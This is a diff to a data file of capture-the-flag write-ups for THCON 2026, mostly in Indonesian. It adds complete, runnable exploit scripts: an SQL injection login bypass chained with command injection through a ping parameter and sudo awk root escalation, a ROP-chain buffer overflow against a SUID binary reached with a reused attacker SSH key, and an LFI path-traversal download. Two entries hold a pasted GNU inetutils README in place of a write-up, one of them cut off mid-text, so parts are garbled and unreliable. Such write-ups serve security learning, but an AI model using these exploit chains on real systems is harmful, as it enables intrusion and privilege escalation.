@@ -1,6 +1,6 @@
 import type { WriteUp } from '../types';
 
-// THCON 2026 — 8 writeups
+// THCON 2026 — 14 writeups
 export const thcon2026Writeups: WriteUp[] = [
   {
     "id": "thcon2026-foren-breach",
@@ -369,6 +369,234 @@ export const thcon2026Writeups: WriteUp[] = [
     ],
     "terminalOutputs": [],
     "flag": "THC{W1tH_eYe5_Wid3_0p3ns_WesTANd}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "thcon2026-pwn-climbme-inetutils",
+    "title": "GNU inetutils - The GNU Networking Utilities",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THCON 2026",
+    "tags": [],
+    "description": "GNU Networking Utilities (Inetutils) are the traditional network\nclients, servers and utilities.  Included are ftp, hostname, ifconfig,\ninetd, logger, ping, rsh, rlogin, talk, telnet, tftp, syslogd,\ntraceroute, whois, and dnsdomainname.",
+    "problemDescription": "GNU Networking Utilities (Inetutils) are the traditional network\nclients, servers and utilities.  Included are ftp, hostname, ifconfig,\ninetd, logger, ping, rsh, rlogin, talk, telnet, tftp, syslogd,\ntraceroute, whois, and dnsdomainname.\n\nSend bug reports to <bug-inetutils@gnu.org>.\n\n\nGNU Inetutils is licensed under the GNU General Public License version\n3.0 or later - see the file [COPYING](COPYING).\n\nThe manual (see doc/) is under the GNU Free Documentation License\nversion 1.3 or later, see [doc/fdl-1.3.texi](doc/fdl-1.3.texi).\n\nOther files are licensed as indicated in each file.  There may be\nexceptions to these general rules, see each file for precise\ninformation.\n\nFor any copyright year range specified as YYYY-ZZZZ in this package\nnote that the range specifies every single year in that closed\ninterval.\n\n\nSee the file INSTALL for generic installation instructions.\n\nThe file `paths` contains a list of all paths used by programs in this\ndistribution, and rules to find values for them.  To change a path\nPATH_FOO, you may either tell configure, by using\n`--with-path-foo=VALUE` (where VALUE may contain references to make\nvariables such as `$(bindir)`), or edit the `paths` file.  See further\nbelow for some important cases.\n\nIf you wish to build only the clients or only the servers, you may\nwish to use the `--disable-servers` or `--disable-clients` options\nwhen invoking `configure`.  You can also use `--enable-<program>` or\n`--disable-<program>` to control whether to build individual programs;\nif you explicitly specify whether to build a program, that will\noverride the values specified by `--disable-clients` or\n`--disable-servers`.\n\n\nThe individual utilities were originally derived from the 4.4BSDLite2\ndistribution.  Many features were integrated from NetBSD, OpenBSD,\nFreeBSD and GNU/Linux.\n\n\nIf you are the author of an awesome program and want to join us in\nwriting Free (libre) Software, please consider making it an official\nGNU program and become a GNU Maintainer.  You can find instructions on\nhow to do this here: http://www.gnu.org/help/evaluation\n\n\nSome words on testing are in order.  The three tests `ftp-localhost`,\n`ping`, and `traceroute`, all need to be run by root.  Several tests\nwill depend on infrastructure files in `/etc/`, but most tests will\ncomplain about their obvious needs.  Anyway, these dependencies are\nimportant whenever chrooted builds are conducted.\n\nAt the time of running a test, the shell variables TEST_IPV4 and\nTEST_IPV6 are influential.  Regard them as taking one of three values:\n`yes`, `no`, or `auto`.  When assigned the value `auto`, a small check\nat runtime will determine if the corresponding address family is available,\nand accordingly include it during test.  The values `yes`, and `no`,\ninclude or exclude the corresponding address family unconditionally.\n\nDuring configuration time, TEST_IPV# is essentially set to `auto`,\nexcept that `-enable-ipv#` assigns `yes`, and `--disable-ipv#` assigns\n`no` unconditionally.  Note however, that `--disable-ipv6` retains\nits property of removing all support for IPv6 in every executable,\nwhile `--disable-ipv4` only affects the testing target `check` and scripts.\n\nDuring chrooted tests, the runtime check for either family can be\nfooled, so setting `TEST_IPV6=yes` might be necessary.  On the other\nhand, chrooting similar to a FreeBSD jail, normally changes the address\nof `localhost`, so similar environments will need counteractions like\n`TARGET=10.0.6.1`.\n\n\nThe GNU whois client reads a whois-servers file to figure out which\nwhois server to use.  It won't always pick the best server;\nwhois.internic.net seems to know something about nic.ddn.mil, but the\nGNU whois client will use nic.ddn.mil to look up nic.ddn.mil if you\nuse the configuration file we supply.  Our configuration file probably\nalso does not have a complete list of whois servers; feel free to send\ninformation about additional whois servers to the bug reporting\naddress.\n\n\n - All of the r* client commands, `rcp`, `rlogin`, `rsh`, used to need\n   to be installed as setuid root to work correctly, since they use\n   privileged ports for communication.  However, some modern operating\n   systems now offer capabilities that avoid the need for setuid\n   settings, and this is accounted for in our present code.\n   CAP_NET_BIND_SERVICE and PRIV_NET_PRIVADDR are relevant for the\n   above three programs.\n\n - Similarly, `ping`, `ping6`, and `traceroute`, used to depend on\n   setuid installation, but also these are now content with\n   capabilities like CAP_NET_RAW, PRIV_NET_ICMPACCESS, and\n   PRIV_NET_RAWACCESS.\n\n\n - Some of the buildable executables depend critically on hard-coded\n   file locations for correct execution.  The most important, where\n   care is needed, are highlighted below.\n\n - `ftpd` needs access to several configuration files, in order that\n   all use cases be covered.  Both of PATH_FTPCHROOT and\n   PATH_FTPWELCOME are normally positioned correctly in sysconfdir by\n   default, whereas PATH_FTPUSERS usually is desired to state\n   `/etc/ftpusers`, but not all systems manage this.  Particular care\n   should be given to PATH_FTPLOGINMESG, since it defaults to\n   `/etc/motd`, which cannot be claimed as universally ideal.  A\n   sensible counter measure could be\n\n     `./configure --with-path-ftploginmesg=$(sysconfdir)/ftpmotd`\n\n   This would, however, complicate matter for chrooted users, so a\n   minor variation on the default could be preferable:\n\n     `./configure --with-path-ftploginmesg=/etc/ftpmotd`\n\n   Finally, the fall-back value `/etc/nologin` for PATH_NOLOGIN is in\n   effect for every systems lacking <paths.h>, but this sets the most\n   plausible location in any case.\n\n - `rcp` relies on PATH_RSH for proper hand-over.  Use the\n   configuration switch `--with-path-rsh=VALUE` for overriding the\n   detected value.  It should point to the intended location of `rsh`,\n   particularly when built with Kerberos support.\n\n - Similarly, `rsh` needs PATH_RLOGIN to locate `rlogin` for correct\n   delegation.  The switch `--with-path-rlogin=VALUE` may come handy\n   to ensure that `rsh` as well as `rlogin` offer identical Kerberos\n   support.\n\n\n - Non-Shishi Kerberos support does not build.  Patches welcome.\n\n - Shishi Kerberos support is only implemented for `rcp`, `rlogin`,\n   `rlogind`, `rsh`, `rshd`, `telnet`, and `telnetd`.\n\n - Not all utilities are Kerberized even when built with Kerberos\n   libraries, including `rcp` for non-Shishi Kerberos.\n\n - InetUtils does not build on HP-UX 11.00, Cygwin, Minix, MinGW,\n   MSCV, BeOS, Haiki (and probably other systems as well).  Patches\n   welcome.\n\n========================================================================\n\nCopyright (C) 1997-2025 Free Software Foundation, Inc.\n\nCopying and distribution of this file, with or without modification,\nare permitted in any medium without royalty provided the copyright\nnotice and this notice are preserved.  This file is offered as-is,\nwithout any warranty.",
+    "tools": [],
+    "analysis": "",
+    "solution": [],
+    "terminalOutputs": [],
+    "flag": "",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "thcon2026-pwn-nocapjustroot-part-1",
+    "title": "No Cap Just Root (part 1/8)",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THCON 2026",
+    "tags": [],
+    "description": "Challenge ini secara praktik lebih mirip rangkaian web exploitation lalu privilege escalation lokal, bukan binary pwn murni. Entry point awal ada di halaman web, lalu akses `root` didapat dari salah konfigurasi `sudo`.",
+    "problemDescription": "Alur exploit-nya:\n\n1. Bypass login dengan SQL injection di `login.php`\n2. Masuk ke `admin.php`\n3. Abuse command injection di parameter `cmd`\n4. Enumerasi hak akses user `web`\n5. Naik ke `root` lewat `sudo /usr/bin/awk`\n6. Baca flag di `/var/www/html/flag.txt`\n\nFlag:\n\n`THC{sqli_and_awk_sudo_is_pure_brainrot}`",
+    "tools": [],
+    "analysis": "Dari RCE, langkah berikutnya adalah cari jalur privilege escalation. Beberapa temuan penting:\n\n- Working directory aplikasi: `/var/www/html`\n- File flag ada di sana, tapi owned by `root`\n- User `web` punya rule `sudo` yang sangat buruk\n\nHasil `sudo -l`:\n\n```text\nUser web may run the following commands on chal-aaa628d0-75d54c8bcf-pcrcp:\n    (ALL) NOPASSWD: /usr/bin/awk\n```\n\nItu langsung jadi jalur root. `awk` bisa memanggil shell lewat `system()`, jadi pada dasarnya kita diberi eksekusi command sebagai root tanpa password.",
+    "solution": [
+      {
+        "title": "Recon awal",
+        "content": "Landing page utama sudah di-deface, tapi source HTML lama masih tertinggal di dalam comment. Dari situ kelihatan beberapa path penting:\n\n- `index.php`\n- `ourteam.php`\n- `admin.php`\n\n`admin.php` saat diakses langsung tidak me-render panel, tapi redirect ke `logout.php`, lalu dari sana ke `login.php`. Jadi fokus langsung pindah ke portal login."
+      },
+      {
+        "title": "1. SQL injection di login",
+        "content": "Form login menerima dua field:\n\n- `user`\n- `pass`\n\nSetelah source `login.php` dibaca dari server, query yang dipakai ternyata seperti ini:\n\n\n\nTidak ada prepared statement, tidak ada escaping, jadi bypass klasik langsung jalan:\n\n\n\nServer merespons dengan redirect ke `admin.php`, artinya sesi berhasil dibuat.",
+        "code": "$query = \"SELECT id FROM login WHERE pseudo = '$username' AND password = '$password'\";"
+      },
+      {
+        "title": "2. Command injection di panel admin",
+        "content": "Setelah login, di halaman admin ada fitur “System checkup” yang mengirim parameter GET bernama `cmd`.\n\nSource `admin.php` menunjukkan bagian rentannya:\n\n\n\nKarena input ditempel langsung ke shell command, kita bisa menambahkan `;` lalu menjalankan command lain.\n\nPayload sederhana untuk bukti RCE:\n\n\n\nOutput:\n\n\n\nJadi kita sudah punya command execution sebagai user `web`.",
+        "code": "system(\"timeout 2s ping \" . $_GET[\"cmd\"]);"
+      },
+      {
+        "title": "4. Privilege escalation ke root",
+        "content": "Payload final:\n\n\n\nPayload itu dieksekusi melalui command injection di parameter `cmd`, misalnya dengan bentuk:\n\n\n\nHasilnya:",
+        "code": "sudo awk 'BEGIN {system(\"id; cat /var/www/html/flag.txt\")}'"
+      },
+      {
+        "title": "Kenapa exploit ini berhasil",
+        "content": "Ada tiga masalah yang ditumpuk sekaligus:\n\n1. Login query raw string concat, jadi SQL injection sangat mudah.\n2. Fitur “ping” memanggil `system()` dengan input user tanpa sanitasi.\n3. User web diberi `sudo NOPASSWD` ke `awk`, yang secara praktis sama dengan kasih root shell.\n\nSatu saja dari tiga celah ini sudah buruk. Digabung, challenge ini selesai cukup cepat setelah source code terbaca."
+      },
+      {
+        "title": "File yang saya buat",
+        "content": "- `exploit.py` untuk menjalankan chain exploit secara otomatis"
+      },
+      {
+        "title": "Cara pakai exploit",
+        "content": "Aktifkan virtualenv yang sudah kamu kasih:\n\n\n\nJalankan:\n\n\n\nKalau mau pakai RCE yang sama untuk command lain:",
+        "code": "source /home/nata/ctf_env/bin/activate"
+      },
+      {
+        "title": "Catatan akhir",
+        "content": "Walau kategorinya ditulis `pwn`, challenge part ini sebenarnya lebih terasa seperti web foothold + local privesc. Titik masuknya bukan memory corruption, tapi kombinasi SQLi, command injection, dan sudo misconfiguration."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport html\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\ndef extract_pre(body: str) -> str:\r\n    start = body.find(\"<pre>\")\r\n    end = body.find(\"</pre>\", start)\r\n    if start == -1 or end == -1:\r\n        return body\r\n    return html.unescape(body[start + 5 : end])\r\n\r\n\r\ndef run_cmd(session: requests.Session, base_url: str, command: str) -> str:\r\n    payload = f\"127.0.0.1;{command}\"\r\n    response = session.get(\r\n        f\"{base_url}/admin.php\",\r\n        params={\"cmd\": payload},\r\n        timeout=20,\r\n    )\r\n    response.raise_for_status()\r\n    return extract_pre(response.text)\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Exploit for THCON 2026 - No Cap Just Root (part 1/8)\"\r\n    )\r\n    parser.add_argument(\r\n        \"--url\",\r\n        default=\"http://chal-aaa628d0.ctf.thcon.party\",\r\n        help=\"Base challenge URL\",\r\n    )\r\n    parser.add_argument(\r\n        \"--cmd\",\r\n        help=\"Run an arbitrary post-auth command via the admin.php injection point\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    session = requests.Session()\r\n\r\n    login = session.post(\r\n        f\"{args.url}/login.php\",\r\n        data={\"user\": \"' or 1=1 -- -\", \"pass\": \"x\"},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    login.raise_for_status()\r\n\r\n    if login.headers.get(\"Location\") != \"admin.php\":\r\n        print(\"[-] SQLi login bypass failed\", file=sys.stderr)\r\n        return 1\r\n\r\n    if args.cmd:\r\n        print(run_cmd(session, args.url, args.cmd))\r\n        return 0\r\n\r\n    flag_cmd = \"\"\"sudo awk 'BEGIN {system(\"id; cat /var/www/html/flag.txt\")}'\"\"\"\r\n    output = run_cmd(session, args.url, flag_cmd)\r\n    print(output)\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "THC{sqli_and_awk_sudo_is_pure_brainrot}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "thcon2026-pwn-nocapjustroot-part-3",
+    "title": "No Cap Just Root (part 3/8)",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THCON 2026",
+    "tags": [],
+    "description": "Part ini melanjutkan foothold dari part sebelumnya. Kunci SSH milik attacker yang sudah didapat di part 2 ternyata masih berlaku, tapi service SSH dibungkus gate aneh di port challenge.",
+    "problemDescription": "Alur solve:\n\n1. Identifikasi bahwa port `46809` sebenarnya adalah SSH yang dibungkus filter\n2. Bypass gate dengan banner client SSH yang mengandung komentar `HTTP/1.0`\n3. Login sebagai `p4t4t0rz` memakai private key yang ditinggalkan attacker\n4. Temukan binary SUID root `skibidi_shell`\n5. Eksploit buffer overflow di menu `Cook Exploit`\n6. Gunakan ROP chain untuk `open(\"/root/flag.txt\")`, `read()`, lalu `write()`\n\nFlag:\n\n`THC{S0m3_R0P_Ch41n_M4g1c}`",
+    "tools": [],
+    "analysis": "`checksec`:\n\n```text\nArch: amd64\nRELRO: Full RELRO\nCanary: No\nNX: Enabled\nPIE: No\nStripped: No\n```\n\nKarena binary tidak strip, analisis jauh lebih cepat. Fungsi menarik:\n\n- `cook_exploit`\n- `summon_rizzler`\n- `vibe_check`\n- helper gadget seperti `useful_gadgets`, `syscall_gadget`, `move_rax_rdi`\n\nBug utamanya ada di `cook_exploit`.\n\nPotongan logika penting:\n\n```c\nchar attacker_ip[0x50];\nread(0, attacker_ip, 0x1940);\n```\n\nJadi ada overflow besar ke stack. Offset ke RIP adalah `0x58`.\n\nCatatan penting: fungsi ini sebelumnya memakai `scanf`, lalu baru `read`. Karena itu exploit lebih stabil jika input dikirim interaktif per tahap, bukan dari file redirection sekali jalan.",
+    "solution": [
+      {
+        "title": "Recon awal",
+        "content": "Service yang diberikan:\n\n\n\nKalau diakses mentah, service cuma menjawab:\n\n\n\nAwalnya ini kelihatan seperti service custom biasa, tapi setelah diproblemkan sedikit lebih jauh, ada perilaku aneh:\n\n- request tertentu memunculkan banner `SSH-2.0-OpenSSH_10.2`\n- `nmap -sV -p 46809` juga mengenali servicenya sebagai SSH\n\nJadi kesimpulan awalnya: port ini adalah SSH yang ditaruh di belakang wrapper/filter.",
+        "code": "nc 20.40.135.232 46809"
+      },
+      {
+        "title": "Bypass gate SSH",
+        "content": "Kunci pentingnya ada di banner client SSH. Wrapper ternyata membolehkan koneksi lanjut kalau banner client mengandung pola yang cocok dengan `HTTP/1.0`.\n\nSupaya koneksi bisa masuk ke SSH asli, client harus mengirim banner seperti ini:\n\n\n\nSaya tidak pakai binary `ssh` biasa karena di environment ini tidak ada opsi mudah untuk mengganti banner. Saya pakai `paramiko` dan set:\n\n\n\nDengan itu wrapper lewat, lalu autentikasi SSH normal bisa jalan.",
+        "code": "SSH-2.0-OpenSSH_9.6 HTTP/1.0"
+      },
+      {
+        "title": "Initial access",
+        "content": "Dari part sebelumnya saya sudah punya private key attacker. User yang valid ternyata:\n\n\n\nSetelah login berhasil, enumerasi cepat menunjukkan:\n\n\n\nDan di home directory ada binary yang sangat mencurigakan:\n\n\n\nPermission-nya:\n\n\n\nIni langsung jadi target utama karena:\n\n- owner `root`\n- bit SUID aktif\n- group `p4t4t0rz`, jadi user kita boleh execute",
+        "code": "p4t4t0rz"
+      },
+      {
+        "title": "Strategi exploit",
+        "content": "Karena:\n\n- binary non-PIE\n- gadget sudah tersedia\n- path `/root/flag.txt` ada di section `.data`\n\nsaya pilih ROP sederhana berbasis fungsi impor PLT:\n\n1. `open(\"/root/flag.txt\", 0, 0)`\n2. pindahkan nilai return fd dari `rax` ke `rdi`\n3. `read(fd, .bss, 0x80)`\n4. `write(1, .bss, 0x80)`\n\nAlamat penting:\n\n- string `/root/flag.txt`: `0x404008`\n- `.bss`: `0x404020`\n- `pop rdi; ret`: `0x4012f1`\n- `pop rsi; ret`: `0x4012f3`\n- `pop rdx; ret`: `0x4012f5`\n- `mov rdi, rax; ret`: `0x40130a`\n- `open@plt`: `0x401180`\n- `read@plt`: `0x4010b0`\n- `write@plt`: `0x401080`"
+      },
+      {
+        "title": "Menjalankan exploit",
+        "content": "Flow interaksi dengan binary:\n\n1. pilih menu `1`\n2. tunggu prompt `Attacker IP`\n3. kirim payload overflow mentah\n4. tunggu prompt `Payload name`\n5. kirim string pendek biasa agar fungsi lanjut sampai `ret`\n\nSaat fungsi `cook_exploit()` selesai, RIP sudah mengambil ROP chain dan binary menulis isi flag ke stdout."
+      },
+      {
+        "title": "File yang saya buat",
+        "content": "- `exploit.py` untuk solve otomatis\n- `ssh_http10_proxy.py` untuk eksperimen bypass awal wrapper SSH\n\nProxy itu akhirnya tidak dipakai untuk solve final, karena pendekatan `paramiko` dengan custom banner lebih bersih."
+      },
+      {
+        "title": "Cara pakai exploit",
+        "content": "Aktifkan virtualenv:\n\n\n\nLalu jalankan:\n\n\n\nScript akan:\n\n1. retry koneksi sampai gate SSH terbuka\n2. login pakai key attacker\n3. jalankan binary SUID\n4. kirim ROP payload\n5. print flag",
+        "code": "source /home/nata/ctf_env/bin/activate"
+      },
+      {
+        "title": "Catatan akhir",
+        "content": "Part ini bukan pwn jaringan murni dari service `nc`, tapi gabungan:\n\n- SSH gate bypass\n- reuse credential dari part sebelumnya\n- local privilege escalation lewat binary SUID yang vulnerable\n\nBegitu akses SSH didapat, exploitasinya sendiri cukup straight-forward karena binary memang sengaja menyediakan semua yang dibutuhkan untuk ROP yang bersih."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\nimport time\r\n\r\nimport paramiko\r\nfrom pwn import p64\r\n\r\n\r\nHOST = \"20.40.135.232\"\r\nPORT = 46809\r\nUSER = \"p4t4t0rz\"\r\nKEY_PATH = \"/home/nata/ctf/THCON2026/pwn/NocapJustRoot/part-2/id_p4t4t0rz\"\r\n\r\n\r\ndef recv_until(chan, marker: bytes, timeout: float = 5.0) -> bytes:\r\n    data = b\"\"\r\n    end = time.time() + timeout\r\n    while marker not in data and time.time() < end:\r\n        if chan.recv_ready():\r\n            data += chan.recv(4096)\r\n        else:\r\n            time.sleep(0.05)\r\n    return data\r\n\r\n\r\ndef build_payload() -> bytes:\r\n    payload = b\"A\" * 0x58\r\n\r\n    payload += p64(0x4012F1) + p64(0x404008)  # pop rdi ; \"/root/flag.txt\"\r\n    payload += p64(0x4012F3) + p64(0)         # pop rsi ; O_RDONLY\r\n    payload += p64(0x4012F5) + p64(0)         # pop rdx ; mode\r\n    payload += p64(0x401180)                  # open@plt\r\n\r\n    payload += p64(0x40130A)                  # mov rdi, rax ; ret\r\n    payload += p64(0x4012F3) + p64(0x404020)  # pop rsi ; .bss\r\n    payload += p64(0x4012F5) + p64(0x80)      # pop rdx ; size\r\n    payload += p64(0x4010B0)                  # read@plt\r\n\r\n    payload += p64(0x4012F1) + p64(1)         # pop rdi ; stdout\r\n    payload += p64(0x4012F3) + p64(0x404020)  # pop rsi ; .bss\r\n    payload += p64(0x4012F5) + p64(0x80)      # pop rdx ; size\r\n    payload += p64(0x401080)                  # write@plt\r\n\r\n    return payload\r\n\r\n\r\ndef connect():\r\n    key = paramiko.Ed25519Key(filename=KEY_PATH)\r\n    sock = socket.create_connection((HOST, PORT), timeout=8)\r\n    transport = paramiko.Transport(sock)\r\n    transport.local_version = \"SSH-2.0-OpenSSH_9.6 HTTP/1.0\"\r\n    transport.banner_timeout = 8\r\n    transport.handshake_timeout = 8\r\n    transport.start_client(timeout=8)\r\n    transport.auth_publickey(USER, key)\r\n    return sock, transport\r\n\r\n\r\ndef main() -> int:\r\n    payload = build_payload()\r\n\r\n    for attempt in range(12):\r\n        sock = None\r\n        transport = None\r\n        chan = None\r\n        try:\r\n            sock, transport = connect()\r\n            chan = transport.open_session()\r\n            chan.exec_command(\"/home/p4t4t0rz/skibidi_shell\")\r\n\r\n            recv_until(chan, b\"> \")\r\n            chan.send(b\"1\\n\")\r\n\r\n            recv_until(chan, b\"Attacker IP (Your Ohio IP): \")\r\n            chan.send(payload)\r\n\r\n            recv_until(chan, b\"Payload name (Sigma script): \")\r\n            chan.send(b\"x\\n\")\r\n\r\n            time.sleep(1)\r\n            out = b\"\"\r\n            end = time.time() + 5\r\n            while time.time() < end:\r\n                if chan.recv_ready():\r\n                    out += chan.recv(4096)\r\n                elif chan.exit_status_ready():\r\n                    break\r\n                else:\r\n                    time.sleep(0.05)\r\n\r\n            text = out.decode(\"utf-8\", \"replace\")\r\n            match = re.search(r\"(THC\\{[^\\r\\n]+\\}|FLAG\\{[^\\r\\n]+\\})\", text)\r\n            if match:\r\n                print(match.group(1))\r\n                return 0\r\n        except Exception:\r\n            time.sleep(6)\r\n        finally:\r\n            try:\r\n                chan.close()\r\n            except Exception:\r\n                pass\r\n            try:\r\n                transport.close()\r\n            except Exception:\r\n                pass\r\n            try:\r\n                sock.close()\r\n            except Exception:\r\n                pass\r\n\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "THC{S0m3_R0P_Ch41n_M4g1c}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "thcon2026-web-authenticationcollapse-docker",
+    "title": ": THCity: Authentication Collapse (part 1/2)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THCON 2026",
+    "tags": [],
+    "description": "Writeup for challenge : THCity: Authentication Collapse (part 1/2)",
+    "problemDescription": "",
+    "tools": [],
+    "analysis": "Setelah melihat file yang diberikan (Docker environment), saya menemukan beberapa komponen utama:\n- `flag_server`: Server Apache dengan PHP yang menjalankan modul kustom `mod_auth_thcity.so`.\n- `sso_server`: Server SSO berbasis Node.js/Express.\n- `redis`: Tempat penyimpanan flag utama.\n\nDi file `flag_server/Dockerfile`, ada petunjuk menarik:\n> `# First flag is only in the compiled module \".so\"`\n\nIni artinya flag untuk part 1 disisipkan ke dalam binary modul Apache saat proses build.",
+    "solution": [
+      {
+        "title": "2. Menemukan Vulnerability",
+        "content": "Saya mengecek file `flag_server/image.php`:\n\nFile ini memiliki celah **Local File Inclusion (LFI)** karena parameter `img` tidak disanitasi. Saya bisa menggunakannya untuk membaca file apa pun di server.",
+        "code": "$img = \"./images/\" . $_GET[\"img\"] ?? \"\";\nif(is_file($img)){\n  readfile($img);\n}"
+      },
+      {
+        "title": "3. Eksploitasi",
+        "content": "Karena saya butuh file `.so` modul Apache, saya mencoba menebak lokasinya. Biasanya di sistem Debian (seperti image `php:8.2-apache`), modul berada di `/usr/lib/apache2/modules/mod_auth_thcity.so`.\n\nSaya mendownload file tersebut menggunakan LFI:\n\n\nSetelah file berhasil didownload, saya mencari string flag di dalamnya:\n\n\nDitemukan flag:\n**THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}**",
+        "code": "curl -s \"http://web-thcity-authentication-collapse.ctf.thcon.party:8888/image.php?img=../../../../../../usr/lib/apache2/modules/mod_auth_thcity.so\" --output mod_auth_thcity.so"
+      },
+      {
+        "title": "4. Kesimpulan",
+        "content": "Flag part 1 berhasil ditemukan di dalam binary modul Apache. Isi flag tersebut (`S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG`) memberikan petunjuk kuat bahwa part 2 akan melibatkan teknik SSRF melalui header injection dan HTTP pipelining pada modul tersebut untuk melewati otentikasi SSO dan mengakses Redis."
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "thcon2026-pwn-climbme",
+    "title": "GNU inetutils - The GNU Networking Utilities",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THCON 2026",
+    "tags": [],
+    "description": "GNU Networking Utilities (Inetutils) are the traditional network\nclients, servers and utilities.  Included are ftp, hostname, ifconfig,\ninetd, logger, ping, rsh, rlogin, talk, telnet, tftp, syslogd,\ntraceroute, whois, and dnsdomainname.",
+    "problemDescription": "GNU Networking Utilities (Inetutils) are the traditional network\nclients, servers and utilities.  Included are ftp, hostname, ifconfig,\ninetd, logger, ping, rsh, rlogin, talk, telnet, tftp, syslogd,\ntraceroute, whois, and dnsdomainname.\n\nSend bug reports to <bug-inetutils@gnu.org>.\n\n\nGNU Inetutils is licensed under the GNU General Public License version\n3.0 or later - see the file [COPYING](COPYING).\n\nThe manual (see doc/) is under the GNU Free Documentation License\nversion 1.3 or later, see [doc/fdl-1.3.texi](doc/fdl-1.3.texi).\n\nOther files are licensed as indicated in each file.  There may be\nexceptions to these general rules, see each file for precise\ninformation.\n\nFor any copyright year range specified as YYYY-ZZZZ in this package\nnote that the range specifies every single year in that closed\ninterval.\n\n\nSee the file INSTALL for generic installation instructions.\n\nThe file `paths` contains a list of all paths used by programs in this\ndistribution, and rules to find values for them.  To change a path\nPATH_FOO, you may either tell configure, by using\n`--with-path-foo=VALUE` (where VALUE may contain references to make\nvariables such as `$(bindir)`), or edit the `paths` file.  See further\nbelow for some important cases.\n\nIf you wish to build only the clients or only the servers, you may\nwish to use the `--disable-servers` or `--disable-clients` options\nwhen invoking `configure`.  You can also use `--enable-<program>` or\n`--disable-<program>` to control whether to build individual programs;\nif you explicitly specify whether to build a program, that will\noverride the values specified by `--disable-clients` or\n`--disable-servers`.\n\n\nThe individual utilities were originally derived from the 4.4BSDLite2\ndistribution.  Many features were integrated from NetBSD, OpenBSD,\nFreeBSD and GNU/Linux.\n\n\nIf you are the author of an awesome program and want to join us in\nwriting Free (libre) Software, please consider making it an official\nGNU program and become a GNU Maintainer.  You can find instructions on\nhow to do this here: http://www.gnu.org/help/evaluation\n\n\nSome words on testing are in order.  The three tests `ftp-localhost`,\n`ping`, and `traceroute`, all need to be run by root.  Several tests\nwill depend on infrastructure files in `/etc/`, but most tests will\ncomplain about their obvious needs.  Anyway, these dependencies are\nimportant whenever chrooted builds are conducted.\n\nAt the time of running a test, the shell variables TEST_IPV4 and\nTEST_IPV6 are influential.  Regard them as taking one of three values:\n`yes`, `no`, or `auto`.  When assigned the value `auto`, a small check\nat runtime will determine if the corresponding address family is available,\nand accordingly include it during test.  The values `yes`, and `no`,\ninclude or exclude the corresponding address family unconditionally.\n\nDuring configuration time, TEST_IPV# is essentially set to `auto`,\nexcept that `-enable-ipv#` assigns `yes`, and `--disable-ipv#` assigns\n`no` unconditionally.  Note however, that `--disable-ipv6` retains\nits property of removing all support for IPv6 in every executable,\nwhile `--disable-ipv4` only affects the testing target `check` and scripts.\n\nDuring chrooted tests, the runtime check for either family can be\nfooled, so setting `TEST_IPV6=yes` might be necessary.  On the other\nhand, chrooting similar to a FreeBSD jail, normally changes the address\nof `localhost`, so similar environments will need counteractions like\n`TARGET=10.0.6.1`.\n\n\nThe GNU whois client reads a whois-servers file to figure out which\nwhois server to use.  It won't always pick the best server;\nwhois.internic.net seems to know something about nic.ddn.mil, but the\nGNU whois client will use nic.ddn.mil to look up nic.ddn.mil if you\nuse the configuration file we supply.  Our configuration file probably\nalso does not have a complete list of whois servers; feel free to send\ninformation about additional whois servers to the bug reporting\naddress.\n\n\n - All of the r* client commands, `rcp`, `rlogin`, `rsh`, used to need\n   to be installed as setuid root to work correctly, since they use\n   privileged ports for communication.  However, some modern operating\n   systems now offer capabilities that avoid the need for setuid\n   settings, and this is accounted for in our present code.\n   CAP_NET_BIND_SERVICE and PRIV_NET_PRIVADDR are relevant for the\n   above three programs.\n\n - Similarly, `ping`, `ping6`, and `traceroute`, used to depend on\n   setuid installation, but also these are now content with\n   capabilities like CAP_NET_RAW, PRIV_NET_ICMPACCESS, and\n   PRIV_NET_RAWACCESS.\n\n\n - Some of the buildable executables depend critically on hard-coded\n   file locations for correct execution.  The most important, where\n   care is needed, are highlighted below.\n\n - `ftpd` needs access to several configuration files, in order that\n   all use cases be covered.  Both of PATH_FTPCHROOT and\n   PATH_FTPWELCOME are normally positioned correctly in sysconfdir by\n   default, whereas PATH_FTPUSERS usually is desired to state\n   `/etc/ftpusers`, but not all systems manage this.  Particular care\n   should be given to PATH_FTPLOGINMESG, since it defaults to\n   `/etc/motd`, which cannot be claimed as universally ideal.  A\n   sensible counter measure could be\n\n     `./configure --with-path-ftploginmesg=$(sysconfdir)/ftpmotd`\n\n   This would, however, complicate matter for chrooted users, so a\n   minor variation on the default could be preferable:\n\n     `./configure 